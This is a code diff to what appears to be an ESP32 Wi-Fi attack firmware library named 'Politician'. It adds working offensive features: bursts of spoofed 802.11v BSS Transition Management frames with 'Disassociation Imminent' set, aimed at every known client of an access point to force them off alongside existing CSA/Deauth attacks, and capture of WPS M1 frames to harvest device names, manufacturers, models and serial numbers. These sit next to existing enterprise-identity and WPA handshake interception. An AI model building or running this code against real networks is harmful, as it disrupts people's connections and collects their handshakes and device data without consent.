@@ -1089,6 +1089,23 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                 _log("[Attack] Starting CSA/Deauth on %02X:%02X:%02X:%02X:%02X:%02X SSID=%.*s ch%d\n",
                     ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5], ap.ssid_len, ap.ssid, beacon_ch);
             }
+            // BTM fires independently — can combine with or replace CSA/Deauth
+            if ((effMask & ATTACK_BTM) && !_isCaptured(ap.bssid)) {
+                for (int ci = 0; ci < MAX_AP_CACHE; ci++) {
+                    if (_apCache[ci].flags.active && memcmp(_apCache[ci].bssid, ap.bssid, 6) == 0) {
+                        for (int s = 0; s < _apCache[ci].known_sta_count; s++) {
+                            for (int b = 0; b < _cfg.btm_burst_count; b++) {
+                                _sendBtmRequest(ap.bssid, _apCache[ci].known_stas[s]);
+                                delay(5);
+                            }
+                        }
+                        _log("[BTM] Sent %d requests to %d clients on %02X:%02X:%02X:%02X:%02X:%02X\n",
+                            _cfg.btm_burst_count, _apCache[ci].known_sta_count,
+                            ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5]);
+                        break;
+                    }
+                }
+            }
             // ----------------------------------
         }
     } else if (subtype == MGMT_SUB_ASSOC_REQ) {
@@ -1216,9 +1233,11 @@ void Politician::_handleData(const ieee80211_hdr_t *hdr, const uint8_t *payload,
     uint16_t eapol_len = len - EAPOL_LLC_SIZE;
 
     if (eapol_len >= 4) {
-        if (eapol[1] == 0x00 && _identityCb != nullptr) {
+        if (eapol[1] == 0x00 && (_identityCb != nullptr || _wpsCb != nullptr)) {
             // Decoupled 802.1X Enterprise Identity Interception
-            _parseEapIdentity(bssid, sta, eapol, eapol_len, rssi);
+            if (_identityCb != nullptr) _parseEapIdentity(bssid, sta, eapol, eapol_len, rssi);
+            // WPS M1 capture (EAP-WSC Expanded type)
+            if (_wpsCb != nullptr) _parseWpsFrame(bssid, sta, eapol, eapol_len, rssi);
         } else if (eapol[1] == 0x03) {
             // Standard WPA2/WPA3 EAPOL-Key Handshake Layer
             _parseEapol(bssid, sta, eapol, eapol_len, rssi);
@@ -1508,6 +1527,111 @@ void Politician::_parseEapIdentity(const uint8_t *bssid, const uint8_t *sta,
          rec.identity, sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);
          
     if (_identityCb) _identityCb(rec);
+}
+
+void Politician::_parseWpsFrame(const uint8_t *bssid, const uint8_t *sta,
+                                 const uint8_t *eapol, uint16_t len, int8_t rssi) {
+    // EAP-WSC layout (starting from eapol[0] which is the EAPOL version byte):
+    // eapol[0-3]: EAPOL header (ver, type=0x00, length 2B)
+    // eapol[4]:   EAP Code (2 = Response)
+    // eapol[5]:   EAP Id
+    // eapol[6-7]: EAP Length
+    // eapol[8]:   EAP Type = 0xFE (Expanded Types)
+    // eapol[9-11]:  Vendor-Id  = 00:37:2A (Wi-Fi Alliance)
+    // eapol[12-15]: Vendor-Type = 00:00:00:01 (WSC)
+    // eapol[16]:  Op-Code (0x04 = WSC_MSG)
+    // eapol[17]:  Flags (bit1 = More Fragments → 2B Message Length follows)
+    // eapol[18+]: WSC TLV data (or eapol[20+] if MF bit set)
+
+    if (len < 18) return;
+    if (eapol[4] != 0x02) return;  // Response only (Enrollee → AP)
+    if (eapol[8] != 0xFE) return;  // Expanded EAP type
+    // Vendor-Id: Wi-Fi Alliance
+    if (eapol[9] != 0x00 || eapol[10] != 0x37 || eapol[11] != 0x2A) return;
+    // Vendor-Type: WSC (00 00 00 01)
+    if (eapol[12] != 0x00 || eapol[13] != 0x00 || eapol[14] != 0x00 || eapol[15] != 0x01) return;
+    if (eapol[16] != 0x04) return;  // WSC_MSG only
+
+    uint16_t tlv_offset = 18;
+    if (eapol[17] & 0x02) tlv_offset += 2;  // MF bit: Message Length field present
+    if (tlv_offset >= len) return;
+
+    const uint8_t *tlv = eapol + tlv_offset;
+    uint16_t tlv_len = len - tlv_offset;
+
+    // First pass: confirm Message Type TLV (0x104A) = M1 (0x04)
+    uint8_t msg_type = 0;
+    uint16_t pos = 0;
+    while (pos + 4 <= tlv_len) {
+        uint16_t attr_type = ((uint16_t)tlv[pos] << 8) | tlv[pos + 1];
+        uint16_t attr_len  = ((uint16_t)tlv[pos + 2] << 8) | tlv[pos + 3];
+        if (pos + 4 + attr_len > tlv_len) break;
+        if (attr_type == 0x104A && attr_len >= 1) { msg_type = tlv[pos + 4]; break; }
+        pos += 4 + attr_len;
+    }
+    if (msg_type != 0x04) return;  // Not M1
+
+    WpsRecord rec; memset(&rec, 0, sizeof(rec));
+    memcpy(rec.bssid, bssid, 6);
+    memcpy(rec.sta, sta, 6);
+    rec.channel = _rxChannel;
+    rec.rssi = rssi;
+
+    // Second pass: extract device attributes
+    pos = 0;
+    while (pos + 4 <= tlv_len) {
+        uint16_t attr_type = ((uint16_t)tlv[pos] << 8) | tlv[pos + 1];
+        uint16_t attr_len  = ((uint16_t)tlv[pos + 2] << 8) | tlv[pos + 3];
+        if (pos + 4 + attr_len > tlv_len) break;
+        const uint8_t *val = tlv + pos + 4;
+
+        auto cpStr = [](char *dst, size_t dsz, const uint8_t *src, uint16_t slen) {
+            uint16_t n = (slen < (uint16_t)(dsz - 1)) ? slen : (uint16_t)(dsz - 1);
+            memcpy(dst, src, n); dst[n] = '\0';
+        };
+
+        switch (attr_type) {
+            case 0x1011: cpStr(rec.device_name,   sizeof(rec.device_name),   val, attr_len); break;
+            case 0x1021: cpStr(rec.manufacturer,  sizeof(rec.manufacturer),  val, attr_len); break;
+            case 0x1023: cpStr(rec.model_name,    sizeof(rec.model_name),    val, attr_len); break;
+            case 0x1024: cpStr(rec.model_number,  sizeof(rec.model_number),  val, attr_len); break;
+            case 0x1042: cpStr(rec.serial_number, sizeof(rec.serial_number), val, attr_len); break;
+            case 0x1004: if (attr_len >= 2) rec.auth_type_flags     = ((uint16_t)val[0] << 8) | val[1]; break;
+            case 0x1008: if (attr_len >= 2) rec.config_methods      = ((uint16_t)val[0] << 8) | val[1]; break;
+            case 0x103C: if (attr_len >= 1) rec.rf_bands            = val[0]; break;
+            case 0x1054: if (attr_len >= 2) rec.primary_dev_type_cat = ((uint16_t)val[0] << 8) | val[1]; break;
+            default: break;
+        }
+        pos += 4 + attr_len;
+    }
+
+    _log("[WPS] M1 from %02X:%02X:%02X:%02X:%02X:%02X dev='%s' mfr='%s' model='%s'\n",
+         sta[0], sta[1], sta[2], sta[3], sta[4], sta[5],
+         rec.device_name, rec.manufacturer, rec.model_name);
+
+    if (_wpsCb) _wpsCb(rec);
+}
+
+void Politician::_sendBtmRequest(const uint8_t *bssid, const uint8_t *sta) {
+    // 802.11v BSS Transition Management Request (Action frame, FC=0xD0 0x00)
+    // Category 0x0A (WNM), Action 0x07, Request Mode bit2 = Disassociation Imminent
+    uint8_t frame[32];
+    int p = 0;
+    frame[p++] = 0xD0; frame[p++] = 0x00;  // FC: Action
+    frame[p++] = 0x00; frame[p++] = 0x00;  // Duration
+    memcpy(frame + p, sta,   6); p += 6;    // DA: target client
+    memcpy(frame + p, bssid, 6); p += 6;   // SA: spoofed as AP
+    memcpy(frame + p, bssid, 6); p += 6;   // BSSID
+    frame[p++] = 0x00; frame[p++] = 0x00;  // Sequence Control
+    frame[p++] = 0x0A;                      // Category: WNM
+    frame[p++] = 0x07;                      // Action: BSS Transition Management Request
+    frame[p++] = 0x01;                      // Dialog Token (non-zero)
+    frame[p++] = 0x04;                      // Request Mode: Disassociation Imminent (bit 2)
+    uint16_t timer = _cfg.btm_disassoc_timer;
+    frame[p++] = (uint8_t)(timer & 0xFF);
+    frame[p++] = (uint8_t)(timer >> 8);
+    frame[p++] = 0x01;                      // Validity Interval (1 TBTT)
+    esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
 }
 
 void Politician::_parseSsid(const uint8_t *ie, uint16_t ie_len, char *out, uint8_t &out_len) {
